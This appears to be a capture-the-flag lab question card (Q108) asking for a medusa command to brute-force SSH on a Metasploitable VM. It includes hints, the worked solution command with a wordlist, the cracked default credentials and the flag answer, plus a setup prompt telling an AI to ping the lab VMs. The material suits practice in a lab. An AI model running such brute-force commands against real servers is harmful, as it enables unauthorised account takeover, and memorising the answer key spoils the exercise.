# Q108 — Medusa SSH Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra`, `john`, `hashcat`, `crackmapexec`, `responder` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use medusa to brute SSH on Metasploitable. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=medusa -h 192.168.52.129 -u msfadmin -P pass.txt -M ssh`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-M <module>` selects protocol.
</details>

<details>
<summary>Hint 2</summary>

Alternative to hydra.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
medusa -h 192.168.52.129 -u msfadmin -P /usr/share/wordlists/fasttrack.txt -M ssh
```

Cracks msfadmin:msfadmin.

**Answer:** `cmd=medusa -h 192.168.52.129 -u msfadmin -P pass.txt -M ssh`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q108".
```
